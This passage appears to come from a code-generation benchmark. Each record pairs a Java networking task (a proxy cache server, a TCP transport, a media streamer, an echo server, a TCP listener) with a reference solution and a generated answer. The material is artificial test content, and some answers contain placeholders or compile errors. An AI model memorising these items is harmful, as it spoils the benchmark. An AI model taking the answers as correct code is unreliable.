    "Instruction": "Task Description: Implement a Java class that acts as an HTTP proxy cache server, handling incoming client connections, processing requests, and managing cached resources. The server should be able to handle multiple concurrent connections efficiently.\n\nClass Description: HttpProxyCacheServer is a TCP server that listens for incoming HTTP requests, processes them through a caching mechanism, and returns the appropriate responses. It manages client connections in a thread-safe manner and maintains a cache of resources.\n\nAttributes:\n\nclientsLock: [Object] - Synchronization object for thread-safe access to clients map\nsocketProcessor: [ExecutorService] - Thread pool for processing socket connections\nclientsMap: [Map<String, HttpProxyCacheServerClients>] - Thread-safe map of URL to client handlers\nserverSocket: [ServerSocket] - Main server socket listening for connections\nport: [int] - Port number the server is listening on\nwaitConnectionThread: [Thread] - Thread that waits for incoming connections\nconfig: [Config] - Server configuration object\n\nMethods:\n\nHttpProxyCacheServer: [Constructor]([Context context]) -> [void] - Initializes the server with default configuration\nHttpProxyCacheServer: [Constructor]([Config config]) -> [void] - Initializes the server with custom configuration\nwaitForRequest: [void]() -> [void] - Continuously accepts incoming connections and delegates processing\nprocessSocket: [void]([Socket socket]) -> [void] - Processes an individual client socket connection\ngetClients: [HttpProxyCacheServerClients]([String url]) -> [HttpProxyCacheServerClients] - Retrieves or creates client handler for a URL\nreleaseSocket: [void]([Socket socket]) -> [void] - Properly closes and releases socket resources\ncloseSocketInput: [void]([Socket socket]) -> [void] - Closes socket input stream\ncloseSocketOutput: [void]([Socket socket]) -> [void] - Closes socket output stream\ncloseSocket: [void]([Socket socket]) -> [void] - Closes the socket connection\nonError: [void]([Throwable e]) -> [void] - Handles errors during server operation\nWaitRequestsRunnable: [Class] - Inner class implementing connection waiting logic\nSocketProcessorRunnable: [Class] - Inner class implementing socket processing logic",
    "Canonical_solution": "import android.content.Context;\nimport java.io.File;\nimport java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.util.Locale;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class HttpProxyCacheServer {\n\n    private static final String PROXY_HOST = \"127.0.0.1\";\n\n    private final Object clientsLock = new Object();\n    private final ExecutorService socketProcessor = Executors.newFixedThreadPool(8);\n    private final Map<String, HttpProxyCacheServerClients> clientsMap = new ConcurrentHashMap<>();\n    private final ServerSocket serverSocket;\n    private final int port;\n    private final Thread waitConnectionThread;\n    private final Config config;\n\n    public HttpProxyCacheServer(Context context) {\n        this(new Builder(context).buildConfig());\n    }\n\n    private HttpProxyCacheServer(Config config) {\n        this.config = config;\n        try {\n            InetAddress inetAddress = InetAddress.getByName(PROXY_HOST);\n            this.serverSocket = new ServerSocket(0, 8, inetAddress);\n            this.port = serverSocket.getLocalPort();\n            CountDownLatch startSignal = new CountDownLatch(1);\n            this.waitConnectionThread = new Thread(new WaitRequestsRunnable(startSignal));\n            this.waitConnectionThread.start();\n            startSignal.await();\n        } catch (IOException | InterruptedException e) {\n            socketProcessor.shutdown();\n            throw new IllegalStateException(\"Error starting local proxy server\", e);\n        }\n    }\n\n    private void waitForRequest() {\n        try {\n            while (!Thread.currentThread().isInterrupted()) {\n                Socket socket = serverSocket.accept();\n                socketProcessor.submit(new SocketProcessorRunnable(socket));\n            }\n        } catch (IOException e) {\n            onError(new ProxyCacheException(\"Error during waiting connection\", e));\n        }\n    }\n\n    private void processSocket(Socket socket) {\n        try {\n            GetRequest request = GetRequest.read(socket.getInputStream());\n            String url = ProxyCacheUtils.decode(request.uri);\n            HttpProxyCacheServerClients clients = getClients(url);\n            clients.processRequest(request, socket);\n        } catch (SocketException e) {\n            // Client closed connection\n        } catch (ProxyCacheException | IOException e) {\n            onError(new ProxyCacheException(\"Error processing request\", e));\n        } finally {\n            releaseSocket(socket);\n        }\n    }\n\n    private HttpProxyCacheServerClients getClients(String url) throws ProxyCacheException {\n        synchronized (clientsLock) {\n            HttpProxyCacheServerClients clients = clientsMap.get(url);\n            if (clients == null) {\n                clients = new HttpProxyCacheServerClients(url, config);\n                clientsMap.put(url, clients);\n            }\n            return clients;\n        }\n    }\n\n    private void releaseSocket(Socket socket) {\n        closeSocketInput(socket);\n        closeSocketOutput(socket);\n        closeSocket(socket);\n    }\n\n    private void closeSocketInput(Socket socket) {\n        try {\n            if (!socket.isInputShutdown()) {\n                socket.shutdownInput();\n            }\n        } catch (IOException e) {\n            onError(new ProxyCacheException(\"Error closing socket input stream\", e));\n        }\n    }\n\n    private void closeSocketOutput(Socket socket) {\n        try {\n            if (!socket.isOutputShutdown()) {\n                socket.shutdownOutput();\n            }\n        } catch (IOException e) {\n            onError(new ProxyCacheException(\"Error closing socket output stream\", e));\n        }\n    }\n\n    private void closeSocket(Socket socket) {\n        try {\n            if (!socket.isClosed()) {\n                socket.close();\n            }\n        } catch (IOException e) {\n            onError(new ProxyCacheException(\"Error closing socket\", e));\n        }\n    }\n\n    private void onError(Throwable e) {\n        // Error handling\n    }\n\n    private final class WaitRequestsRunnable implements Runnable {\n        private final CountDownLatch startSignal;\n\n        public WaitRequestsRunnable(CountDownLatch startSignal) {\n            this.startSignal = startSignal;\n        }\n\n        @Override\n        public void run() {\n            startSignal.countDown();\n            waitForRequest();\n        }\n    }\n\n    private final class SocketProcessorRunnable implements Runnable {\n        private final Socket socket;\n\n        public SocketProcessorRunnable(Socket socket) {\n            this.socket = socket;\n        }\n\n        @Override\n        public void run() {\n            processSocket(socket);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.*;\nimport java.util.concurrent.*;\n\npublic class HttpProxyCacheServer {\n    private final Object clientsLock = new Object();\n    private ExecutorService socketProcessor;\n    private Map<String, HttpProxyCacheServerClients> clientsMap;\n    private ServerSocket serverSocket;\n    private int port;\n    private Thread waitConnectionThread;\n    private Config config;\n\n    public HttpProxyCacheServer(Context context) {\n        this(new Config());\n    }\n\n    public HttpProxyCacheServer(Config config) {\n        this.config = config;\n        this.clientsMap = new ConcurrentHashMap<>();\n        this.port = config.getPort();\n        try {\n            this.serverSocket = new ServerSocket(port);\n            this.socketProcessor = Executors.newCachedThreadPool();\n            this.waitConnectionThread = new Thread(new WaitRequestsRunnable());\n            this.waitConnectionThread.start();\n        } catch (IOException e) {\n            onError(e);\n        }\n    }\n\n    public void waitForRequest() {\n        while (!Thread.interrupted()) {\n            try {\n                Socket clientSocket = serverSocket.accept();\n                socketProcessor.execute(new SocketProcessorRunnable(clientSocket));\n            } catch (IOException e) {\n                onError(e);\n                break;\n            }\n        }\n    }\n\n    public void processSocket(Socket socket) {\n        try {\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            OutputStream out = socket.getOutputStream();\n\n            String url = \"\";\n            String line;\n            while (!(line = in.readLine()).isEmpty()) {\n                if (line.startsWith(\"GET \")) {\n                    url = line.substring(4).trim();\n                    break;\n                }\n            }\n\n            if (!url.isEmpty()) {\n                HttpProxyCacheServerClients clientHandler = getClients(url);\n                clientHandler.process(in, out);\n            } else {\n                releaseSocket(socket);\n            }\n        } catch (Exception e) {\n            onError(e);\n            releaseSocket(socket);\n        }\n    }\n\n    public HttpProxyCacheServerClients getClients(String url) {\n        synchronized (clientsLock) {\n            return clientsMap.computeIfAbsent(url, k -> new HttpProxyCacheServerClients(k, config));\n        }\n    }\n\n    public void releaseSocket(Socket socket) {\n        closeSocketInput(socket);\n        closeSocketOutput(socket);\n        closeSocket(socket);\n    }\n\n    public void closeSocketInput(Socket socket) {\n        try {\n            InputStream is = socket.getInputStream();\n            if (is != null) {\n                is.close();\n            }\n        } catch (IOException ignored) {\n        }\n    }\n\n    public void closeSocketOutput(Socket socket) {\n        try {\n            OutputStream os = socket.getOutputStream();\n            if (os != null) {\n                os.close();\n            }\n        } catch (IOException ignored) {\n        }\n    }\n\n    public void closeSocket(Socket socket) {\n        try {\n            if (socket != null && !socket.isClosed()) {\n                socket.close();\n            }\n        } catch (IOException ignored) {\n        }\n    }\n\n    public void onError(Throwable e) {\n        e.printStackTrace();\n    }\n\n    private class WaitRequestsRunnable implements Runnable {\n        public void run() {\n            waitForRequest();\n        }\n    }\n\n    private class SocketProcessorRunnable implements Runnable {\n        private final Socket socket;\n\n        public SocketProcessorRunnable(Socket socket) {\n            this.socket = socket;\n        }\n\n        public void run() {\n            processSocket(socket);\n        }\n    }\n}\n\nclass HttpProxyCacheServerClients {\n    private String url;\n    private Config config;\n\n    public HttpProxyCacheServerClients(String url, Config config) {\n        this.url = url;\n        this.config = config;\n    }\n\n    public void process(BufferedReader in, OutputStream out) throws IOException {\n        // Placeholder for processing logic\n        String response = \"HTTP/1.1 200 OK\\r\\nContent-Length: 0\\r\\n\\r\\n\";\n        out.write(response.getBytes());\n        out.flush();\n    }\n}\n\nclass Config {\n    private int port = 8080;\n\n    public int getPort() {\n        return port;\n    }\n}\n\nclass Context {\n    // Placeholder for application context\n}\n```"
  },
  {
    "Task_id": 523,
    "Instruction": "Task Description: Implement a TCP transport class that can function as either a server or client, handling network communication with configurable buffer sizes and TCP_NODELAY option.\n\nClass Description: TcpTransport is a class that provides TCP-based communication capabilities, acting as either a server (accepting connections) or client (initiating connections). It manages socket creation, stream handling, and includes a dedicated receiver thread for asynchronous data reception.\n\nAttributes:\n- srv_sock: [ServerSocket] - Server socket instance for accepting connections (server mode)\n- sock: [Socket] - Socket instance for communication (both modes)\n- output: [OutputStream] - Output stream for sending data\n- input: [InputStream] - Input stream for receiving data\n- receiver_thread: [Receiver] - Thread for handling incoming data\n- receiver: [RtReceiver] - Callback handler for received data\n- host: [InetAddress] - Host address for connection\n- port: [int] - Port number for communication (default: 7800)\n- out_buf_size: [int] - Output buffer size (default: 8192)\n- in_buf_size: [int] - Input buffer size (default: 8192)\n- server: [boolean] - Flag indicating server mode\n- tcp_nodelay: [boolean] - TCP_NODELAY socket option flag\n- log: [Log] - Logger instance\n\nMethods:\n- start: [void](String... options) -> [void] - Initializes the transport in either server or client mode, creates sockets and streams, starts receiver thread\n- stop: [void]() -> [void] - Closes all resources (sockets and streams)\n- send: [void](byte[] buf, int offset, int length) -> [void] - Sends data through the output stream\n- Receiver (inner class): [void](InputStream in) -> [void] - Thread class that continuously reads incoming data and notifies receiver callback",
    "Canonical_solution": "import org.jgroups.logging.Log;\nimport org.jgroups.logging.LogFactory;\nimport org.jgroups.tests.RoundTrip;\nimport org.jgroups.tests.rt.RtReceiver;\nimport org.jgroups.util.Util;\n\nimport java.io.*;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class TcpTransport {\n    protected ServerSocket srv_sock;\n    protected Socket sock;\n    protected OutputStream output;\n    protected InputStream input;\n    protected Receiver receiver_thread;\n    protected RtReceiver receiver;\n    protected InetAddress host;\n    protected int port=7800;\n    protected int out_buf_size=8192, in_buf_size=8192;\n    protected boolean server, tcp_nodelay;\n    protected final Log log=LogFactory.getLog(TcpTransport.class);\n\n    public void start(String ... options) throws Exception {\n        if(server) {\n            srv_sock=new ServerSocket(port, 50, host);\n            Socket s=srv_sock.accept();\n            s.setTcpNoDelay(tcp_nodelay);\n            input=in_buf_size > 0? new BufferedInputStream(s.getInputStream(), in_buf_size) : s.getInputStream();\n            output=out_buf_size > 0? new BufferedOutputStream(s.getOutputStream(), out_buf_size) : s.getOutputStream();\n            receiver_thread=new Receiver(input);\n            receiver_thread.start();\n        }\n        else {\n            sock=new Socket();\n            sock.setTcpNoDelay(tcp_nodelay);\n            sock.connect(new InetSocketAddress(host, port));\n            input=in_buf_size > 0? new BufferedInputStream(sock.getInputStream(), in_buf_size) : sock.getInputStream();\n            output=out_buf_size > 0? new BufferedOutputStream(sock.getOutputStream(), out_buf_size) : sock.getOutputStream();\n            receiver_thread=new Receiver(input);\n            receiver_thread.start();\n        }\n    }\n\n    public void stop() {\n        Util.close(sock, srv_sock, input, output);\n    }\n\n    public void send(byte[] buf, int offset, int length) throws Exception {\n        output.write(buf, offset, length);\n        output.flush();\n    }\n\n    protected class Receiver extends Thread {\n        protected final InputStream in;\n\n        public Receiver(InputStream in) {\n            this.in=in;\n        }\n\n        public void run() {\n            byte[] buf=new byte[RoundTrip.PAYLOAD];\n            for(;;) {\n                try {\n                    int num=in.read(buf, 0, buf.length);\n                    if(num == -1)\n                        return;\n                    if(num != buf.length)\n                        throw new IllegalStateException(\"expected \" + buf.length + \" bytes, but got only \" + num);\n                    if(receiver != null)\n                        receiver.receive(null, buf, 0, buf.length);\n                }\n                catch(Exception e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.logging.Logger;\n\npublic class TcpTransport {\n    private ServerSocket srv_sock;\n    private Socket sock;\n    private OutputStream output;\n    private InputStream input;\n    private Thread receiver_thread;\n    private RtReceiver receiver;\n    private InetAddress host;\n    private int port = 7800;\n    private int out_buf_size = 8192;\n    private int in_buf_size = 8192;\n    private boolean server;\n    private boolean tcp_nodelay;\n    private Logger log = Logger.getLogger(TcpTransport.class.getName());\n\n    public void start(String... options) {\n        for (String opt : options) {\n            if (opt.equals(\"server\")) server = true;\n            else if (opt.startsWith(\"host=\")) host = parseInetAddress(opt.substring(5));\n            else if (opt.startsWith(\"port=\")) port = Integer.parseInt(opt.substring(5));\n            else if (opt.startsWith(\"out_buf_size=\")) out_buf_size = Integer.parseInt(opt.substring(13));\n            else if (opt.startsWith(\"in_buf_size=\")) in_buf_size = Integer.parseInt(opt.substring(12));\n            else if (opt.equals(\"tcp_nodelay\")) tcp_nodelay = true;\n        }\n\n        try {\n            if (server) {\n                srv_sock = new ServerSocket(port);\n                sock = srv_sock.accept();\n            } else {\n                sock = new Socket();\n                sock.connect(new InetSocketAddress(host, port));\n            }\n            sock.setTcpNoDelay(tcp_nodelay);\n\n            output = new BufferedOutputStream(sock.getOutputStream(), out_buf_size);\n            input = new BufferedInputStream(sock.getInputStream(), in_buf_size);\n\n            receiver_thread = new Thread(new Receiver(input));\n            receiver_thread.start();\n        } catch (Exception e) {\n            log.severe(\"Failed to start TCP transport: \" + e.getMessage());\n        }\n    }\n\n    public void stop() {\n        try {\n            if (receiver_thread != null) receiver_thread.interrupt();\n            if (output != null) output.close();\n            if (input != null) input.close();\n            if (sock != null) sock.close();\n            if (srv_sock != null) srv_sock.close();\n        } catch (IOException e) {\n            log.warning(\"Error closing resources: \" + e.getMessage());\n        }\n    }\n\n    public void send(byte[] buf, int offset, int length) {\n        try {\n            output.write(buf, offset, length);\n            output.flush();\n        } catch (IOException e) {\n            log.severe(\"Send failed: \" + e.getMessage());\n        }\n    }\n\n    private InetAddress parseInetAddress(String address) throws UnknownHostException {\n        return InetAddress.getByName(address);\n    }\n\n    private class Receiver implements Runnable {\n        private final InputStream in;\n\n        public Receiver(InputStream in) {\n            this.in = in;\n        }\n\n        @Override\n        public void run() {\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            try {\n                while (!Thread.interrupted()) {\n                    bytesRead = in.read(buffer);\n                    if (bytesRead == -1) break;\n                    if (receiver != null) receiver.onDataReceived(buffer, 0, bytesRead);\n                }\n            } catch (IOException | RuntimeException e) {\n                log.severe(\"Receiver thread error: \" + e.getMessage());\n            } finally {\n                stop();\n            }\n        }\n    }\n\n    public interface RtReceiver {\n        void onDataReceived(byte[] data, int offset, int length);\n    }\n}\n```"
  },
  {
    "Task_id": 524,
    "Instruction": "Task Description: Create a Java class that implements an HTTP media streaming server capable of serving files over a local network connection using TCP sockets.\n\nClass Description: The HttpMediaStreamer class provides functionality to stream media files over HTTP protocol. It creates a local server socket, handles incoming client connections, and streams the requested file with proper HTTP headers. The class manages the server lifecycle and provides access to the streaming URI.\n\nAttributes:\n- uri: Uri - The URI pointing to the local HTTP streaming endpoint\n- serverSocket: ServerSocket - The server socket instance used for listening to client connections\n- TAG: String - Constant for logging purposes (class name)\n\nMethods:\n- HttpMediaStreamer(String filename, String mimeType) -> [Constructor] - Initializes the streamer with the file to serve and its MIME type\n- getUri() -> Uri - Returns the streaming URI for the hosted file\n- destroy() -> void - Closes the server socket and cleans up resources\n- create(String filename, String mimeType) -> Uri - Internal method that sets up the server socket and starts the streaming thread",
    "Canonical_solution": "import info.guardianproject.iocipher.File;\nimport info.guardianproject.iocipher.FileInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport android.net.Uri;\nimport android.util.Log;\n\npublic class HttpMediaStreamer {\n    private static final String TAG = HttpMediaStreamer.class.getSimpleName();\n    private Uri uri;\n    private ServerSocket serverSocket;\n\n    public HttpMediaStreamer(String filename, String mimeType) throws IOException {\n        uri = create(filename, mimeType);\n    }\n\n    public Uri getUri() {\n        return uri;\n    }\n\n    public void destroy() {\n        try {\n            if (serverSocket != null)\n                serverSocket.close();\n        } catch (Exception e) {\n        }\n    }\n\n    private Uri create(final String filename, final String mimeType) throws IOException {\n        final File file = new File(filename);\n        if (!file.exists()) {\n            throw new IOException(\"File not found \" + filename);\n        }\n\n        try {\n            if (serverSocket != null)\n                serverSocket.close();\n        } catch (Exception e) {\n        }\n\n        serverSocket = new ServerSocket(0);\n        new Thread() {\n            public void run() {\n                try {\n                    while (true) {\n                        Socket socket = serverSocket.accept();\n                        byte[] b = new byte[8192];\n                        int len;\n\n                        InputStream is = socket.getInputStream();\n                        StringBuilder isb = new StringBuilder();\n                        len = is.read(b);\n                        isb.append(new String(b));\n\n                        StringBuilder sb = new StringBuilder();\n                        sb.append(\"HTTP/1.1 200\\r\\n\");\n                        sb.append(\"Content-Type: \" + mimeType + \"\\r\\n\");\n                        sb.append(\"Content-Length: \" + file.length() + \"\\r\\n\\r\\n\");\n\n                        BufferedOutputStream bos = new BufferedOutputStream(socket.getOutputStream());\n                        bos.write(sb.toString().getBytes());\n\n                        FileInputStream fis = new FileInputStream(file);\n                        int idx = 0;\n\n                        while ((len = fis.read(b)) != -1) {\n                            bos.write(b, 0, len);\n                            idx += len;\n                            Log.d(TAG, \"sharing via stream: \" + idx);\n                        }\n\n                        fis.close();\n                        bos.flush();\n                        bos.close();\n                        socket.close();\n                    }\n                } catch (IOException e) {\n                    Log.d(TAG, \"web share error\", e);\n                }\n            }\n        }.start();\n\n        Uri uri = Uri.parse(\"http://localhost:\" + serverSocket.getLocalPort() + file.getAbsolutePath());\n        return uri;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport android.net.Uri;\nimport java.io.*;\nimport java.net.*;\n\npublic class HttpMediaStreamer {\n    private Uri uri;\n    private ServerSocket serverSocket;\n    private static final String TAG = \"HttpMediaStreamer\";\n\n    public HttpMediaStreamer(String filename, String mimeType) {\n        create(filename, mimeType);\n    }\n\n    public Uri getUri() {\n        return uri;\n    }\n\n    public void destroy() {\n        try {\n            if (serverSocket != null && !serverSocket.isClosed()) {\n                serverSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void create(String filename, String mimeType) {\n        Thread serverThread = new Thread(() -> {\n            try {\n                int port = 8080;\n                serverSocket = new ServerSocket(port);\n                uri = Uri.parse(\"http://localhost:\" + port + \"/\" + filename);\n\n                while (!serverSocket.isClosed()) {\n                    Socket clientSocket = serverSocket.accept();\n                    handleClient(clientSocket, filename, mimeType);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n        serverThread.start();\n    }\n\n    private void handleClient(Socket clientSocket, String filename, String mimeType) {\n        try {\n            File file = new File(filename);\n            FileInputStream fis = new FileInputStream(file);\n            OutputStream out = clientSocket.getOutputStream();\n\n            String responseLine = \"HTTP/1.1 200 OK\\r\\n\";\n            String header = \"Content-Type: \" + mimeType + \"\\r\\n\" +\n                            \"Content-Length: \" + file.length() + \"\\r\\n\" +\n                            \"Connection: close\\r\\n\\r\\n\";\n            out.write(responseLine.getBytes());\n            out.write(header.getBytes());\n\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = fis.read(buffer)) != -1) {\n                out.write(buffer, 0, bytesRead);\n            }\n\n            fis.close();\n            out.flush();\n            clientSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 525,
    "Instruction": "Task Description: Create a Java class that implements a multithreaded TCP echo server capable of handling both plain and SSL/TLS encrypted connections. The server should echo back any data received from clients and support SSL renegotiation.\n\nClass Description: EchoServer is a Thread subclass that creates a TCP server listening on a specified port. It can operate in both plain and SSL/TLS modes, maintains connections in threads, and provides methods for graceful shutdown and connection management.\n\nAttributes:\n- port: int - The port number the server listens on\n- serverSocket: ServerSocket - The server socket accepting client connections\n- threads: List<Thread> - Synchronized list of active client handler threads\n- sockets: List<Socket> - Synchronized list of active client sockets\n- exceptions: List<Exception> - Synchronized list of encountered exceptions\n- renegotiate: AtomicBoolean - Flag to trigger SSL renegotiation\n\nMethods:\n- EchoServer(int port) -> void - Constructor for plain TCP server\n- EchoServer(SSLFactory sslFactory, int port) -> void - Constructor for SSL/TLS server\n- renegotiate() -> void - Triggers SSL renegotiation for all connections\n- run() -> void - Main server thread accepting connections and spawning handlers\n- closeConnections() -> void - Closes all active client connections\n- close() -> void - Shuts down the server gracefully\n- getExceptionCount() -> int - Returns count of encountered exceptions",
    "Canonical_solution": "import com.github.ambry.commons.SSLFactory;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.ArrayList;\nimport java.util.Collections;\nimport java.util.List;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLServerSocket;\nimport javax.net.ssl.SSLSocket;\n\npublic class EchoServer extends Thread {\n  public final int port;\n  private final ServerSocket serverSocket;\n  private final List<Thread> threads;\n  private final List<Socket> sockets;\n  private final List<Exception> exceptions;\n  private final AtomicBoolean renegotiate = new AtomicBoolean();\n\n  public EchoServer(int port) throws Exception {\n    this(null, port);\n  }\n\n  public EchoServer(SSLFactory sslFactory, int port) throws Exception {\n    this.port = port;\n    if (sslFactory == null) {\n      this.serverSocket = new ServerSocket(port);\n    } else {\n      SSLContext sslContext = sslFactory.getSSLContext();\n      this.serverSocket = sslContext.getServerSocketFactory().createServerSocket(port);\n      ((SSLServerSocket) this.serverSocket).setNeedClientAuth(true);\n    }\n    this.threads = Collections.synchronizedList(new ArrayList<Thread>());\n    this.sockets = Collections.synchronizedList(new ArrayList<Socket>());\n    this.exceptions = Collections.synchronizedList(new ArrayList<Exception>());\n  }\n\n  public void renegotiate() {\n    renegotiate.set(true);\n  }\n\n  @Override\n  public void run() {\n    try {\n      while (true) {\n        final Socket socket = serverSocket.accept();\n        sockets.add(socket);\n        Thread thread = new Thread() {\n          @Override\n          public void run() {\n            try {\n              socket.setSoTimeout(3000);\n              DataInputStream input = new DataInputStream(socket.getInputStream());\n              DataOutputStream output = new DataOutputStream(socket.getOutputStream());\n              while (socket.isConnected() && !socket.isClosed()) {\n                long size = input.readLong();\n                if (renegotiate.compareAndSet(true, false)) {\n                  ((SSLSocket) socket).startHandshake();\n                }\n                byte[] bytes = new byte[(int) size - 8];\n                input.readFully(bytes);\n                output.writeLong(size);\n                output.write(bytes);\n                output.flush();\n              }\n            } catch (IOException e) {\n              // ignore, caused by client closed connection\n            } finally {\n              try {\n                socket.close();\n              } catch (IOException e) {\n                exceptions.add(e);\n              }\n            }\n          }\n        };\n        thread.start();\n        threads.add(thread);\n      }\n    } catch (IOException e) {\n      exceptions.add(e);\n    }\n  }\n\n  public void closeConnections() throws IOException {\n    for (Socket socket : sockets) {\n      socket.close();\n    }\n  }\n\n  public void close() throws IOException, InterruptedException {\n    this.serverSocket.close();\n    closeConnections();\n    for (Thread t : threads) {\n      t.join();\n    }\n    join();\n  }\n\n  public int getExceptionCount() {\n    return exceptions.size();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport javax.net.ssl.*;\nimport java.io.*;\nimport java.net.*;\nimport java.util.*;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class EchoServer extends Thread {\n    private final int port;\n    private ServerSocket serverSocket;\n    private final List<Thread> threads = Collections.synchronizedList(new ArrayList<>());\n    private final List<Socket> sockets = Collections.synchronizedList(new ArrayList<>());\n    private final List<Exception> exceptions = Collections.synchronizedList(new ArrayList<>());\n    private final AtomicBoolean renegotiate = new AtomicBoolean(false);\n\n    public EchoServer(int port) throws IOException {\n        this.port = port;\n        this.serverSocket = new ServerSocket(port);\n    }\n\n    public EchoServer(SSLContext sslContext, int port) throws IOException {\n        this.port = port;\n        SSLServerSocketFactory ssf = sslContext.getServerSocketFactory();\n        this.serverSocket = ssf.createServerSocket(port);\n    }\n\n    public void renegotiate() {\n        renegotiate.set(true);\n    }\n\n    @Override\n    public void run() {\n        try {\n            while (!Thread.interrupted()) {\n                Socket clientSocket = serverSocket.accept();\n                sockets.add(clientSocket);\n                Thread handler = new Thread(() -> handleClient(clientSocket));\n                threads.add(handler);\n                handler.start();\n            }\n        } catch (IOException e) {\n            exceptions.add(e);\n        }\n    }\n\n    private void handleClient(Socket socket) {\n        try (\n            InputStream input = socket.getInputStream();\n            OutputStream output = socket.getOutputStream()\n        ) {\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = input.read(buffer)) != -1) {\n                if (renegotiate.get() && socket instanceof SSLSocket) {\n                    ((SSLSocket) socket).startHandshake();\n                    renegotiate.set(false);\n                }\n                output.write(buffer, 0, bytesRead);\n                output.flush();\n            }\n        } catch (IOException e) {\n            exceptions.add(e);\n        } finally {\n            synchronized (sockets) {\n                sockets.remove(socket);\n            }\n        }\n    }\n\n    public void closeConnections() {\n        for (Socket socket : new ArrayList<>(sockets)) {\n            try {\n                socket.close();\n            } catch (IOException e) {\n                exceptions.add(e);\n            }\n        }\n    }\n\n    public void close() {\n        closeConnections();\n        try {\n            if (serverSocket != null && !serverSocket.isClosed()) {\n                serverSocket.close();\n            }\n        } catch (IOException e) {\n            exceptions.add(e);\n        }\n        interrupt();\n    }\n\n    public int getExceptionCount() {\n        return exceptions.size();\n    }\n}\n```"
  },
  {
    "Task_id": 526,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using ServerSocket to accept client connections and read data from them.\n\nClass Description: The GraphiteBridge class provides functionality to start a TCP server, accept client connections, read data from connected clients, and properly close all connections and resources.\n\nAttributes:\n- serverSocket: ServerSocket - The server socket that listens for incoming client connections\n- clientSocket: Socket - The socket representing an accepted client connection\n- inputReader: BufferedReader - The reader used to read data from the client connection\n\nMethods:\n- startServer(int port) -> void - Starts the server socket listening on the specified port\n- acceptConnection() -> void - Accepts an incoming client connection and initializes the input reader\n- readData() -> String - Reads a line of data from the connected client\n- closeConnection() -> void - Closes all open resources including the input reader, client socket, and server socket",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class GraphiteBridge {\n\n    private ServerSocket serverSocket;\n    private Socket clientSocket;\n    private BufferedReader inputReader;\n\n    public void startServer(int port) throws IOException {\n        serverSocket = new ServerSocket(port);\n    }\n\n    public void acceptConnection() throws IOException {\n        clientSocket = serverSocket.accept();\n        inputReader = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n    }\n\n    public String readData() throws IOException {\n        return inputReader.readLine();\n    }\n\n    public void closeConnection() throws IOException {\n        if (inputReader != null) {\n            inputReader.close();\n        }\n        if (clientSocket != null) {\n            clientSocket.close();\n        }\n        if (serverSocket != null) {\n            serverSocket.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class GraphiteBridge {\n    private ServerSocket serverSocket;\n    private Socket clientSocket;\n    private BufferedReader inputReader;\n\n    public void startServer(int port) throws IOException {\n        serverSocket = new ServerSocket(port);\n    }\n\n    public void acceptConnection() throws IOException {\n        clientSocket = serverSocket.accept();\n        inputReader = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n    }\n\n    public String readData() throws IOException {\n        return inputReader.readLine();\n    }\n\n    public void closeConnection() throws IOException {\n        if (inputReader != null) {\n            inputReader.close();\n        }\n        if (clientSocket != null) {\n            clientSocket.close();\n        }\n        if (serverSocket != null) {\n            serverSocket.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 527,
    "Instruction": "Task Description: Create a TCP proxy server class that handles bidirectional communication between a client and a remote server, with capabilities to start, monitor usage, and shutdown the proxy.\n\nClass Description: JankyProxy is a TCP proxy server implementation that listens on a local port, forwards client requests to a remote server, and relays responses back to the client. It uses multithreading to handle bidirectional communication simultaneously.\n\nAttributes:\n- thread: ThreadProxy - The worker thread handling the proxy operations\n- sClient: Socket - The client socket connection\n- socket: ServerSocket - The server socket listening for client connections\n- SERVER_URL: String - The URL of the remote server to proxy to\n- SERVER_PORT: int - The port of the remote server to proxy to\n- wasUsedForClientToServer: boolean - Flag indicating if the proxy was used for client-to-server communication\n\nMethods:\n- runServer(String host, int remoteport, int localport) -> void - Starts the proxy server listening on the specified local port and forwarding to the given remote host and port\n- wasUsed() -> boolean - Returns whether the proxy was used for client-to-server communication\n- shutdown() -> void - Gracefully shuts down the proxy server\n- run() -> void - (ThreadProxy method) The main proxy logic handling bidirectional communication between client and server\n- shutdown() -> void - (ThreadProxy method) Stops the proxy thread 